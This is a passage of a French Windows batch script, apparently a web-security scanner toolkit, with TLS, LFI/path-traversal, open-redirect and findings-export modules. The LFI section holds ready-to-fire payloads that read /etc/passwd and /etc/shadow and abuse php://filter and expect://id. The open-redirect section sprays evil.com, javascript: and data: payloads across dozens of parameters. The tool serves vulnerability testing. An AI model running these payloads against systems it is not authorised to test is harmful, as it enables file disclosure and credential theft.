echo        $ssl.AuthenticateAsClient($host_target, $null, $proto.Enum, $false) >> "%TLS_PS%"
echo        if ($proto.Sev -eq 'OK') { >> "%TLS_PS%"
echo            Write-Host "  [OK] $($proto.Name) supporte (bon)" -f Green >> "%TLS_PS%"
echo        } else { >> "%TLS_PS%"
echo            Add-TlsFinding $proto.Sev "$($proto.Name) accepte par le serveur !" $proto.Pts >> "%TLS_PS%"
echo        } >> "%TLS_PS%"
echo        $ssl.Close(); $tcp.Close() >> "%TLS_PS%"
echo    } catch { >> "%TLS_PS%"
echo        if ($proto.Sev -ne 'OK') { >> "%TLS_PS%"
echo            Write-Host "  [OK] $($proto.Name) refuse (securise)" -f Green >> "%TLS_PS%"
echo        } else { >> "%TLS_PS%"
echo            Write-Host "  [--] $($proto.Name) non supporte" -f DarkGray >> "%TLS_PS%"
echo        } >> "%TLS_PS%"
echo    } >> "%TLS_PS%"
echo } >> "%TLS_PS%"
echo. >> "%TLS_PS%"
echo Write-Host "" >> "%TLS_PS%"
echo Write-Host "  [2/4] Analyse du certificat..." -f Blue >> "%TLS_PS%"
echo try { >> "%TLS_PS%"
echo    $req = [Net.HttpWebRequest]::Create("https://${host_target}:${port}/") >> "%TLS_PS%"
echo    $req.Timeout = $timeout >> "%TLS_PS%"
echo    $req.ServerCertificateValidationCallback = { param($s,$c,$ch,$e); $script:cert=$c; return $true } >> "%TLS_PS%"
echo    try { $null = $req.GetResponse() } catch {} >> "%TLS_PS%"
echo    if ($script:cert) { >> "%TLS_PS%"
echo        $exp  = [DateTime]::Parse($script:cert.GetExpirationDateString()) >> "%TLS_PS%"
echo        $iss  = $script:cert.Issuer >> "%TLS_PS%"
echo        $sub  = $script:cert.Subject >> "%TLS_PS%"
echo        $days = ([int]($exp - (Get-Date)).TotalDays) >> "%TLS_PS%"
echo        Write-Host "  Sujet   : $sub" -f Gray >> "%TLS_PS%"
echo        Write-Host "  Emetteur: $iss" -f Gray >> "%TLS_PS%"
echo        Write-Host "  Expir.  : $($exp.ToString('dd/MM/yyyy')) ($days jours restants)" -f $(if($days -lt 0){'Red'}elseif($days -lt 30){'Yellow'}else{'Green'}) >> "%TLS_PS%"
echo        if ($days -lt 0)  { Add-TlsFinding 'CRITIQUE' "Certificat EXPIRE depuis $([math]::Abs($days)) jours !" 50 } >> "%TLS_PS%"
echo        elseif ($days -lt 15) { Add-TlsFinding 'CRITIQUE' "Certificat expire dans $days jours !" 30 } >> "%TLS_PS%"
echo        elseif ($days -lt 30) { Add-TlsFinding 'ELEVE'    "Certificat expire bientot ($days jours)" 15 } >> "%TLS_PS%"
echo        if ($sub -notmatch [regex]::Escape($host_target)) { >> "%TLS_PS%"
echo            Add-TlsFinding 'ELEVE' "Nom de domaine ne correspond pas au certificat (possible MITM)" 20 >> "%TLS_PS%"
echo        } >> "%TLS_PS%"
echo    } >> "%TLS_PS%"
echo } catch { Write-Host "  [!] Impossible d'analyser le certificat." -f DarkGray } >> "%TLS_PS%"
echo. >> "%TLS_PS%"
echo Write-Host "" >> "%TLS_PS%"
echo Write-Host "  [3/4] Verification des headers de securite TLS..." -f Blue >> "%TLS_PS%"
echo try { >> "%TLS_PS%"
echo    $r = Invoke-WebRequest "https://${host_target}:${port}/" -TimeoutSec 8 -UseBasicParsing -EA Stop >> "%TLS_PS%"
echo    $h = $r.Headers >> "%TLS_PS%"
echo    if (-not $h['Strict-Transport-Security']) { Add-TlsFinding 'ELEVE'   'HSTS manquant - downgrade HTTP possible' 20 } >> "%TLS_PS%"
echo    else { >> "%TLS_PS%"
echo        $hsts = $h['Strict-Transport-Security'] >> "%TLS_PS%"
echo        Write-Host "  [OK] HSTS present : $hsts" -f Green >> "%TLS_PS%"
echo        if ($hsts -notmatch 'includeSubDomains') { Add-TlsFinding 'MOYEN' 'HSTS sans includeSubDomains' 5 } >> "%TLS_PS%"
echo        if ($hsts -notmatch 'preload')           { Add-TlsFinding 'INFO'  'HSTS sans preload' 0 } >> "%TLS_PS%"
echo    } >> "%TLS_PS%"
echo    if (-not $h['Content-Security-Policy']) { Add-TlsFinding 'MOYEN' 'CSP manquant' 10 } >> "%TLS_PS%"
echo    if ($h['X-Powered-By'])  { Add-TlsFinding 'INFO' "Techno exposee : $($h['X-Powered-By'])" 0 } >> "%TLS_PS%"
echo    if ($h['Server'])        { Add-TlsFinding 'INFO' "Serveur expose : $($h['Server'])" 0 } >> "%TLS_PS%"
echo } catch { Write-Host "  [!] HTTPS inaccessible sur ce port." -f DarkGray } >> "%TLS_PS%"
echo. >> "%TLS_PS%"
echo Write-Host "" >> "%TLS_PS%"
echo Write-Host "  [4/4] Test redirection HTTP vers HTTPS..." -f Blue >> "%TLS_PS%"
echo try { >> "%TLS_PS%"
echo    $redir = Invoke-WebRequest "http://${host_target}/" -MaximumRedirection 0 -TimeoutSec 5 -UseBasicParsing -EA Stop >> "%TLS_PS%"
echo    Add-TlsFinding 'ELEVE' "HTTP ne redirige pas vers HTTPS (code $($redir.StatusCode))" 20 >> "%TLS_PS%"
echo } catch { >> "%TLS_PS%"
echo    $loc = $_.Exception.Response.Headers['Location'] >> "%TLS_PS%"
echo    if ($loc -like 'https://*') { Write-Host "  [OK] Redirection HTTP -> HTTPS presente" -f Green } >> "%TLS_PS%"
echo    else { Add-TlsFinding 'MOYEN' 'Redirection HTTP vers HTTPS absente ou incorrecte' 10 } >> "%TLS_PS%"
echo } >> "%TLS_PS%"
echo. >> "%TLS_PS%"
echo Write-Host "" >> "%TLS_PS%"
echo Write-Host "  ================================================" -f Cyan >> "%TLS_PS%"
echo $grade = if($script:score -ge 90){'A+'}elseif($script:score -ge 75){'B'}elseif($script:score -ge 50){'C'}elseif($script:score -ge 25){'D'}else{'F'} >> "%TLS_PS%"
echo $gc    = if($script:score -ge 75){'Green'}elseif($script:score -ge 50){'Yellow'}else{'Red'} >> "%TLS_PS%"
echo Write-Host "  Score TLS : $script:score/100  Grade : $grade" -f $gc >> "%TLS_PS%"
echo if ($script:findings.Count -eq 0) { Write-Host "  [OK] Aucun probleme TLS detecte !" -f Green } >> "%TLS_PS%"
echo Write-Host "" >> "%TLS_PS%"
echo Write-Host "  [!] RISQUES TLS :" -f Red >> "%TLS_PS%"
echo Write-Host "  1. Interception : Des protocoles faibles (SSLv3) permettent le MITM." -f Yellow >> "%TLS_PS%"
echo Write-Host "  2. Phishing : Un certificat expire ou mal nomme detruit la confiance." -f Yellow >> "%TLS_PS%"
echo Write-Host "  3. Downgrade : L'absence de HSTS permet de forcer le passage en HTTP." -f Yellow >> "%TLS_PS%"
echo Write-Host "  ================================================" -f Cyan >> "%TLS_PS%"
echo. >> "%TLS_PS%"
echo $exportChoice = Read-Host "  Exporter les resultats en JSON ? (O/N)" >> "%TLS_PS%"
echo if ($exportChoice -eq 'O' -or $exportChoice -eq 'o') { >> "%TLS_PS%"
echo    $out = [PSCustomObject]@{ >> "%TLS_PS%"
echo        Date    = (Get-Date -Format 'yyyy-MM-dd HH:mm') >> "%TLS_PS%"
echo        Cible   = "${host_target}:${port}" >> "%TLS_PS%"
echo        Score   = $script:score >> "%TLS_PS%"
echo        Grade   = $grade >> "%TLS_PS%"
echo        Findings = $script:findings >> "%TLS_PS%"
echo    } >> "%TLS_PS%"
echo    $jsonPath = "$([Environment]::GetFolderPath('Desktop'))\TLS_Scan_${host_target}_$(Get-Date -Format 'yyyyMMdd_HHmm').json" >> "%TLS_PS%"
echo    $out ^| ConvertTo-Json -Depth 5 ^| Out-File $jsonPath -Encoding UTF8 >> "%TLS_PS%"
echo    Write-Host "  [OK] Export JSON : $jsonPath" -f Green >> "%TLS_PS%"
echo } >> "%TLS_PS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%TLS_PS%"
if exist "%TLS_PS%" del /f /q "%TLS_PS%"
echo.
pause
goto net_cyber_menu


:cyber_lfi_scan
cls
echo.
echo  ===========================================================
echo   LFI / PATH TRAVERSAL - Detection automatisee
echo  ===========================================================
echo   Tente de lire des fichiers systeme distants
echo   via des failles de chemins de fichiers.
echo  ===========================================================
echo.
echo  Entrez l'URL avec parametre (ex: https://site.com/page?file=)
set "ALEEX_LFI_URL="
set /p "ALEEX_LFI_URL=URL : "
if not defined ALEEX_LFI_URL goto net_cyber_menu

set "LFI_PS=%TEMP%\lfi_scan_%RANDOM%.ps1"
if exist "%LFI_PS%" del /f /q "%LFI_PS%"

echo $baseUrl = $env:ALEEX_LFI_URL >> "%LFI_PS%"
echo $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" >> "%LFI_PS%"
echo $vulns = 0 >> "%LFI_PS%"
echo $vulns = 0
echo. >> "%LFI_PS%"
echo $payloads = @( >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Linux classique (1)';   P='../etc/passwd';                          Detect='root:x:^|daemon:^|nobody:^|/bin/bash' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Linux classique (2)';   P='../../etc/passwd';                       Detect='root:x:^|daemon:^|nobody:^|/bin/bash' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Linux classique (3)';   P='../../../etc/passwd';                    Detect='root:x:^|daemon:^|nobody:^|/bin/bash' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Linux classique (4)';   P='../../../../etc/passwd';                 Detect='root:x:^|daemon:^|nobody:^|/bin/bash' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Linux (5 niveaux)';     P='../../../../../etc/passwd';              Detect='root:x:^|daemon:^|nobody:^|/bin/bash' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Linux (6 niveaux)';     P='../../../../../../etc/passwd';           Detect='root:x:^|daemon:^|nobody:^|/bin/bash' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Linux shadow';          P='../../../etc/shadow';                    Detect='\$[16]\$^|root:\*' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Linux /etc/hosts';      P='../../../etc/hosts';                     Detect='127\.0\.0\.1^|localhost^|::1' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Windows win.ini';       P='..\..\..\windows\win.ini';               Detect='\[fonts\]^|\[extensions\]^|for 16-bit' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Windows win.ini alt';   P='../../../windows/win.ini';               Detect='\[fonts\]^|\[extensions\]^|for 16-bit' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Windows hosts';         P='..\..\..\windows\system32\drivers\etc\hosts'; Detect='127\.0\.0\.1^|localhost' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='URL encoded (..//)';    P='..%2f..%2f..%2fetc%2fpasswd';            Detect='root:x:^|daemon:^|nobody:' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Double encoded';        P='..%252f..%252f..%252fetc%252fpasswd';    Detect='root:x:^|daemon:^|nobody:' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Null byte (PHP old)';   P='../../../etc/passwd%%00';                 Detect='root:x:^|daemon:^|nobody:' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='PHP filter base64';     P='php://filter/convert.base64-encode/resource=index.php'; Detect='^[A-Za-z0-9+/]{20}' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='PHP filter rot13';      P='php://filter/read=string.rot13/resource=index.php'; Detect='cuc^|<?^|<?php^|rput^|erfcbafr' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='PHP input';             P='php://input';                            Detect='php^|html^|body^|<?^|<html' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='data:// wrapper';       P='data://text/plain;base64,dGVzdA==';      Detect='test' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='expect:// wrapper';     P='expect://id';                            Detect='uid=^|root^|www-data' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Absolute path /etc';    P='/etc/passwd';                            Detect='root:x:^|daemon:^|nobody:' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='Absolute Windows';      P='C:/windows/win.ini';                     Detect='\[fonts\]^|\[extensions\]' }, >> "%LFI_PS%"
echo    [PSCustomObject]@{ Name='UNC path (Windows)';    P='\\127.0.0.1\c$\windows\win.ini';         Detect='\[fonts\]' } >> "%LFI_PS%"
echo ) >> "%LFI_PS%"
echo. >> "%LFI_PS%"
echo Write-Host "" >> "%LFI_PS%"
echo Write-Host "  Test de $($payloads.Count) payloads LFI/Path Traversal..." -f Cyan >> "%LFI_PS%"
echo Write-Host "  (Appuyez sur ECHAP pour annuler)" -f DarkGray >> "%LFI_PS%"
echo Write-Host "" >> "%LFI_PS%"
echo. >> "%LFI_PS%"
echo foreach ($p in $payloads) { >> "%LFI_PS%"
echo    if ($Host.UI.RawUI.KeyAvailable) { >> "%LFI_PS%"
echo        $k = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown') >> "%LFI_PS%"
echo        if ($k.VirtualKeyCode -eq 27) { Write-Host "`n  [!] Annule." -f Red; break } >> "%LFI_PS%"
echo    } >> "%LFI_PS%"
echo    $enc = [uri]::EscapeDataString($p.P) >> "%LFI_PS%"
echo    $testUrl = $baseUrl + $enc >> "%LFI_PS%"
echo    Write-Host "  [?] $($p.Name.PadRight(30))" -f DarkGray -NoNewline >> "%LFI_PS%"
echo    try { >> "%LFI_PS%"
echo        $r = Invoke-WebRequest $testUrl -UserAgent $ua -TimeoutSec 6 -EA Stop -UseBasicParsing >> "%LFI_PS%"
echo        if ($r.Content -match $p.Detect) { >> "%LFI_PS%"
echo            Write-Host "[!!!] VULNERABLE !" -f Red >> "%LFI_PS%"
echo            $snippet = $r.Content -replace '\s+',' ' ^| ForEach-Object { $_.Substring(0, [math]::Min(150, $_.Length)) } >> "%LFI_PS%"
echo            Write-Host "       Payload  : $($p.P)" -f Magenta >> "%LFI_PS%"
echo            Write-Host "       Extrait  : $snippet" -f Yellow >> "%LFI_PS%"
echo            $vulns++ >> "%LFI_PS%"
echo        } elseif ($r.StatusCode -eq 200) { >> "%LFI_PS%"
echo            Write-Host "[ ] Reponse 200 (non concluant)" -f DarkGray >> "%LFI_PS%"
echo        } else { >> "%LFI_PS%"
echo            Write-Host "[-] HTTP $($r.StatusCode)" -f DarkGray >> "%LFI_PS%"
echo        } >> "%LFI_PS%"
echo    } catch { Write-Host "[-] Erreur/Bloque" -f DarkGray } >> "%LFI_PS%"
echo } >> "%LFI_PS%"
echo. >> "%LFI_PS%"
echo Write-Host "" >> "%LFI_PS%"
echo Write-Host "  ================================================" -f Cyan >> "%LFI_PS%"
echo if ($vulns -gt 0) { >> "%LFI_PS%"
echo    Write-Host "  [!!!] $vulns LFI/Path Traversal detecte(s) !" -f Red >> "%LFI_PS%"
echo    Write-Host "  Consequences possibles :" -f Red >> "%LFI_PS%"
echo    Write-Host "    - Lecture de /etc/passwd (liste des utilisateurs)" -f Yellow >> "%LFI_PS%"
echo    Write-Host "    - Lecture de /etc/shadow (hashes de mots de passe)" -f Yellow >> "%LFI_PS%"
echo    Write-Host "    - Lecture du code source PHP via php://filter" -f Yellow >> "%LFI_PS%"
echo    Write-Host "    - Escalade vers RCE via expect:// ou log poisoning" -f Yellow >> "%LFI_PS%"
echo } else { >> "%LFI_PS%"
echo    Write-Host "  [OK] Aucun LFI/Path Traversal detecte." -f Green >> "%LFI_PS%"
echo } >> "%LFI_PS%"
echo Write-Host "  ================================================" -f Cyan >> "%LFI_PS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%LFI_PS%"
if exist "%LFI_PS%" del /f /q "%LFI_PS%"
echo.
pause
goto net_cyber_menu


REM ===================================================================
REM         EXPORT JSON UNIFIE DES FINDINGS
REM ===================================================================
:cyber_export_json
cls
echo.
echo  ===========================================================
echo   EXPORT JSON UNIFIE - Centralisateur de findings
echo  ===========================================================
echo   Consolide tous les resultats de scans en un
echo   fichier JSON structure et portable.
echo  ===========================================================
echo.

set "EJ_PS=%TEMP%\export_json_%RANDOM%.ps1"

(
echo $desktop = [Environment]::GetFolderPath('Desktop')
echo $date    = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
echo $dateFile = Get-Date -Format 'yyyyMMdd_HHmm'
echo $findings = @()
echo $scanFiles = @()
echo.
echo Write-Host ""
echo Write-Host "  Recherche des rapports JSON precedents sur le Bureau..." -f Cyan
echo $jsonFiles = Get-ChildItem $desktop -Filter "*.json" -EA SilentlyContinue
echo if ($jsonFiles) {
echo    Write-Host "  Fichiers JSON trouves :" -f Green
echo    $jsonFiles | ForEach-Object { Write-Host "    - $($_.Name)" -f Gray }
echo    Write-Host ""
echo    foreach ($f in $jsonFiles) {
echo        try {
echo            $data = Get-Content $f.FullName -Raw | ConvertFrom-Json
echo            $findings += $data
echo            $scanFiles += $f.Name
echo        } catch { Write-Host "  [!] Impossible de lire $($f.Name)" -f DarkGray }
echo    }
echo } else {
echo    Write-Host "  Aucun JSON trouve. Creation d'un rapport vide." -f Yellow
echo }
echo.
echo Write-Host "  Saisie manuelle de findings supplementaires (optionnel)..." -f Blue
echo Write-Host "  (Appuyez sur ENTREE sans saisie pour terminer)" -f DarkGray
echo Write-Host ""
echo $manualFindings = @()
echo while ($true) {
echo    $target = Read-Host "  Cible (ex: https://site.com) ou ENTREE pour terminer"
echo    if ([string]::IsNullOrWhiteSpace($target)) { break }
echo    $sev    = Read-Host "  Severite (CRITIQUE/ELEVE/MOYEN/INFO)"
echo    $cat    = Read-Host "  Categorie (ex: SQLi, XSS, LFI, TLS...)"
echo    $msg    = Read-Host "  Description"
echo    $cvss   = Read-Host "  Score CVSS estimé (0.0-10.0, ou ENTREE pour auto)"
echo    if ([string]::IsNullOrWhiteSpace($cvss)) {
echo        $cvss = switch($sev) { 'CRITIQUE' {'9.0'}; 'ELEVE' {'7.0'}; 'MOYEN' {'5.0'}; default {'2.0'} }
echo    }
echo    $manualFindings += [PSCustomObject]@{ Cible=$target; Severite=$sev; Categorie=$cat; Description=$msg; CVSS=$cvss; Source='Manuel' }
echo    Write-Host "  [+] Finding ajoute." -f Green
echo }
echo.
echo $report = [PSCustomObject]@{
echo    Meta = [PSCustomObject]@{
echo        Outil      = 'AleexScripts Cyber v2.0'
echo        Date       = $date
echo        Ordinateur = $env:COMPUTERNAME
echo        Operateur  = $env:USERNAME
echo        FichiersSource = $scanFiles
echo    }
echo    Statistiques = [PSCustomObject]@{
echo        TotalFindings  = ($findings.Count + $manualFindings.Count)
echo        Critiques      = ($findings.Findings + $manualFindings | Where-Object { $_.Severite -eq 'CRITIQUE' }).Count
echo        Eleves         = ($findings.Findings + $manualFindings | Where-Object { $_.Severite -eq 'ELEVE' }).Count
echo        Moyens         = ($findings.Findings + $manualFindings | Where-Object { $_.Severite -eq 'MOYEN' }).Count
echo    }
echo    FindingsImportes = $findings
echo    FindingsManuels  = $manualFindings
echo }
echo.
echo $outFile = "$desktop\Rapport_Findings_$dateFile.json"
echo $report | ConvertTo-Json -Depth 10 | Out-File $outFile -Encoding UTF8
echo.
echo Write-Host ""
echo Write-Host "  ================================================" -f Cyan
echo Write-Host "  [OK] Rapport JSON exporte : $outFile" -f Green
echo Write-Host "  Total findings : $($report.Statistiques.TotalFindings)" -f White
echo Write-Host "  Critiques      : $($report.Statistiques.Critiques)" -f Red
echo Write-Host "  Eleves         : $($report.Statistiques.Eleves)" -f Yellow
echo Write-Host "  Moyens         : $($report.Statistiques.Moyens)" -f Cyan
echo Write-Host "  ================================================" -f Cyan
) > "%EJ_PS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%EJ_PS%"
if exist "%EJ_PS%" del /f /q "%EJ_PS%"
echo.
pause
goto net_cyber_menu


REM ===================================================================
REM         OPEN REDIRECT - Detection avancee
REM ===================================================================
:cyber_open_redirect
cls
echo.
echo  ===========================================================
echo   OPEN REDIRECT - Detection avancee
echo  ===========================================================
echo   Teste 40+ vecteurs de redirection pour
echo   prevenir les attaques de phishing.
echo  ===========================================================
echo.
echo  Entrez l'URL cible (ex: https://site.com/redirect)
set "ALEEX_OR_URL="
set /p "ALEEX_OR_URL=URL : "
if not defined ALEEX_OR_URL goto net_cyber_menu

set "OR_PS=%TEMP%\openredirect_%RANDOM%.ps1"
if exist "%OR_PS%" del /f /q "%OR_PS%"

echo $url = $env:ALEEX_OR_URL >> "%OR_PS%"
echo $ua = "Mozilla/5.0" >> "%OR_PS%"
echo $vulns = 0 >> "%OR_PS%"
echo. >> "%OR_PS%"
echo $params = @('url','redirect','redirect_url','redirect_uri','return','return_url', >> "%OR_PS%"
echo    'returnUrl','return_to','next','dest','destination','go','goto','link','out', >> "%OR_PS%"
echo    'target','redir','r','u','to','forward','forward_url','continue','cont','ref', >> "%OR_PS%"
echo    'referrer','callback','checkout_url','success_url','cancel_url','view','page', >> "%OR_PS%"
echo    'navigation','location','path','uri','site','domain','host','login','logout') >> "%OR_PS%"
echo. >> "%OR_PS%"
echo $payloads = @( >> "%OR_PS%"
echo    'https://evil.com', >> "%OR_PS%"
echo    '//evil.com', >> "%OR_PS%"
echo    '///evil.com', >> "%OR_PS%"
echo    '////evil.com', >> "%OR_PS%"
echo    'https:evil.com', >> "%OR_PS%"
echo    '\evil.com', >> "%OR_PS%"
echo    '\\evil.com', >> "%OR_PS%"
echo    'javascript:alert(1)', >> "%OR_PS%"
echo    'data:text/html,^<script^>alert(1)^</script^>', >> "%OR_PS%"
echo    '%%2f%%2fevil.com', >> "%OR_PS%"
echo    '%%5c%%5cevil.com', >> "%OR_PS%"
echo    'https://evil.com%%23@legitimate.com', >> "%OR_PS%"
echo    'https://legitimate.com.evil.com' >> "%OR_PS%"
echo ) >> "%OR_PS%"
echo. >> "%OR_PS%"
echo Write-Host "" >> "%OR_PS%"
echo Write-Host "  Test de $($params.Count) parametres x $($payloads.Count) payloads..." -f Cyan >> "%OR_PS%"
echo Write-Host "" >> "%OR_PS%"
echo. >> "%OR_PS%"
echo foreach ($param in $params) { >> "%OR_PS%"
echo    foreach ($payload in $payloads) { >> "%OR_PS%"
echo        $sep = if ($url -match '\?') { '^&' } else { '?' } >> "%OR_PS%"
echo        $testUrl = $url + $sep + $param + '=' + [uri]::EscapeDataString($payload) >> "%OR_PS%"
echo        try { >> "%OR_PS%"
echo            $r = Invoke-WebRequest $testUrl -UserAgent $ua -MaximumRedirection 0 -TimeoutSec 5 -EA Stop -UseBasicParsing >> "%OR_PS%"
echo            if ($r.StatusCode -in 301,302,303,307,308) { >> "%OR_PS%"
echo                $loc = $r.Headers['Location'] >> "%OR_PS%"
echo                if ($loc -match 'evil\.com^|javascript:^|data:') { >> "%OR_PS%"
echo                    Write-Host "  [!!!] Open Redirect CONFIRME !" -f Red >> "%OR_PS%"
echo                    Write-Host "        Parametre : $param" -f Magenta >> "%OR_PS%"
echo                    Write-Host "        Payload   : $payload" -f Magenta >> "%OR_PS%"
echo                    Write-Host "        Location  : $loc" -f Yellow >> "%OR_PS%"
echo                    $vulns++; break >> "%OR_PS%"
echo                } >> "%OR_PS%"
echo            } >> "%OR_PS%"
echo        } catch { >> "%OR_PS%"
echo            $loc = $_.Exception.Response.Headers['Location'] >> "%OR_PS%"
echo            if ($loc -match 'evil\.com^|javascript:^|data:') { >> "%OR_PS%"
echo                Write-Host "  [!!!] Open Redirect CONFIRME (exception) !" -f Red >> "%OR_PS%"
echo                Write-Host "        Parametre : $param ^| Location : $loc" -f Yellow >> "%OR_PS%"
echo                $vulns++; break >> "%OR_PS%"
echo            } >> "%OR_PS%"
echo        } >> "%OR_PS%"
echo    } >> "%OR_PS%"
echo } >> "%OR_PS%"
echo. >> "%OR_PS%"
echo Write-Host "" >> "%OR_PS%"
echo if ($vulns -gt 0) { >> "%OR_PS%"
echo    Write-Host "  [!!!] $vulns Open Redirect(s) detecte(s) !" -f Red >> "%OR_PS%"
echo    Write-Host "" >> "%OR_PS%"
echo    Write-Host "  [!] ANALYSE DES RISQUES (Open Redirect) :" -f Red >> "%OR_PS%"
echo    Write-Host "  1. Phishing : Un pirate utilise votre domaine de confiance pour pieger vos clients." -f Yellow >> "%OR_PS%"
echo    Write-Host "  2. Malware : Redirige automatiquement l'utilisateur vers le telechargement d'un virus." -f Yellow >> "%OR_PS%"
echo    Write-Host "  3. Reputation : Votre domaine peut etre blacklisté par les navigateurs et mails." -f Yellow >> "%OR_PS%"
echo    Write-Host "  CONSEIL : N'utilisez que des chemins relatifs ou une liste blanche (whitelist)." -f Cyan >> "%OR_PS%"
echo } >> "%OR_PS%"
echo else { Write-Host "  [OK] Aucun Open Redirect detecte." -f Green } >> "%OR_PS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%OR_PS%"
if exist "%OR_PS%" del /f /q "%OR_PS%"
echo.
pause
goto net_cyber_menu

:sys_diag_network
cls
set "DIAG_LOG=%USERPROFILE%\Desktop\Diagnostic_Reseau.log"
set /a "ECHEC_COUNT=0"
echo ================================
echo    DIAGNOSTIC RESEAU COMPLET
echo ================================
echo Analyse de l'etat de votre connexion.
echo Un journal complet est genere en temps reel sur le Bureau.
echo.

echo ================================ > "%DIAG_LOG%"
echo    DIAGNOSTIC RESEAU COMPLET     >> "%DIAG_LOG%"
echo       %date% %time%              >> "%DIAG_LOG%"
echo ================================ >> "%DIAG_LOG%"
echo. >> "%DIAG_LOG%"

echo [1/4] Test de la carte reseau locale (TCP/IP)...
echo [1/4] Test de la carte reseau locale (TCP/IP)... >> "%DIAG_LOG%"
ping -n 2 127.0.0.1 | findstr /i "temps= TTL= attente impossible" > "%TEMP%\netdiag_ping.txt"
powershell -NoProfile -Command "Get-Content '%TEMP%\netdiag_ping.txt' -Encoding OEM | ForEach-Object { $l = '   ' + $_.Trim(); Write-Host $l -ForegroundColor DarkGray; $l | Out-File -FilePath '%DIAG_LOG%' -Append -Encoding UTF8 }"
findstr /i "temps= TTL=" "%TEMP%\netdiag_ping.txt" >nul
if !errorlevel!==0 (
    echo   -^> [OK] La carte reseau fonctionne ^(pilote OK^).
    echo   -^> [OK] La carte reseau fonctionne ^(pilote OK^). >> "%DIAG_LOG%"
) else (
    set /a "ECHEC_COUNT+=1"
    echo   -^> [ECHEC] Probleme avec la carte reseau locale ^(Pilote ou materiel^).
    echo   -^> [ECHEC] Probleme avec la carte reseau locale ^(Pilote ou materiel^). >> "%DIAG_LOG%"
)

echo.
echo. >> "%DIAG_LOG%"
echo [2/4] Test de connexion a la Box/Routeur (Passerelle par defaut)...
echo [2/4] Test de connexion a la Box/Routeur (Passerelle par defaut)... >> "%DIAG_LOG%"
set "gateway="
for /f "usebackq tokens=*" %%g in (`powershell -NoProfile -Command "(Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty NextHop) 2>$null"`) do set "gateway=%%g"

if "!gateway!"=="" (
    set /a "ECHEC_COUNT+=1"
    echo [INFO] Aucune IP de passerelle trouvee via l'interface reseau.
    echo [INFO] Aucune IP de passerelle trouvee via l'interface reseau. >> "%DIAG_LOG%"
    echo   -^> [ECHEC] Aucune passerelle detectee ^(Cable debranche ou probleme Wi-Fi / DHCP^).
    echo   -^> [ECHEC] Aucune passerelle detectee ^(Cable debranche ou probleme Wi-Fi / DHCP^). >> "%DIAG_LOG%"
) else (
    echo [INFO] Passerelle detectee : !gateway!
    echo [INFO] Passerelle detectee : !gateway! >> "%DIAG_LOG%"
    ping -n 2 !gateway! | findstr /i "temps= TTL= attente impossible" > "%TEMP%\netdiag_ping.txt"
    powershell -NoProfile -Command "Get-Content '%TEMP%\netdiag_ping.txt' -Encoding OEM | ForEach-Object { $l = '   ' + $_.Trim(); Write-Host $l -ForegroundColor DarkGray; $l | Out-File -FilePath '%DIAG_LOG%' -Append -Encoding UTF8 }"
    findstr /i "temps= TTL=" "%TEMP%\netdiag_ping.txt" >nul
    if !errorlevel!==0 (
        echo   -^> [OK] Connecte a la Box/Routeur ^(!gateway!^).
        echo   -^> [OK] Connecte a la Box/Routeur ^(!gateway!^). >> "%DIAG_LOG%"
    ) else (
        set /a "ECHEC_COUNT+=1"
        echo   -^> [ECHEC] Impossible de joindre la Box/Routeur ^(!gateway!^).
        echo   -^> [ECHEC] Impossible de joindre la Box/Routeur ^(!gateway!^). >> "%DIAG_LOG%"
    )
)

echo.
echo. >> "%DIAG_LOG%"
echo [3/4] Test de connexion a Internet (Serveur externe 8.8.8.8)...
echo [3/4] Test de connexion a Internet (Serveur externe 8.8.8.8)... >> "%DIAG_LOG%"
ping -n 2 8.8.8.8 | findstr /i "temps= TTL= attente impossible" > "%TEMP%\netdiag_ping.txt"
powershell -NoProfile -Command "Get-Content '%TEMP%\netdiag_ping.txt' -Encoding OEM | ForEach-Object { $l = '   ' + $_.Trim(); Write-Host $l -ForegroundColor DarkGray; $l | Out-File -FilePath '%DIAG_LOG%' -Append -Encoding UTF8 }"
findstr /i "temps= TTL=" "%TEMP%\netdiag_ping.txt" >nul
if !errorlevel!==0 (
    echo   -^> [OK] Acces Internet externe etabli.
    echo   -^> [OK] Acces Internet externe etabli. >> "%DIAG_LOG%"
) else (
    set /a "ECHEC_COUNT+=1"
    echo   -^> [ECHEC] Pas d'acces Internet ^(Coupure operateur FAI ou Box non connectee^).
    echo   -^> [ECHEC] Pas d'acces Internet ^(Coupure operateur FAI ou Box non connectee^). >> "%DIAG_LOG%"
)

echo.
echo. >> "%DIAG_LOG%"
echo [4/4] Test de resolution DNS (Ping domaine)...
echo [4/4] Test de resolution DNS (Ping domaine)... >> "%DIAG_LOG%"
ping -n 2 google.com | findstr /i "temps= TTL= attente impossible" > "%TEMP%\netdiag_ping.txt"
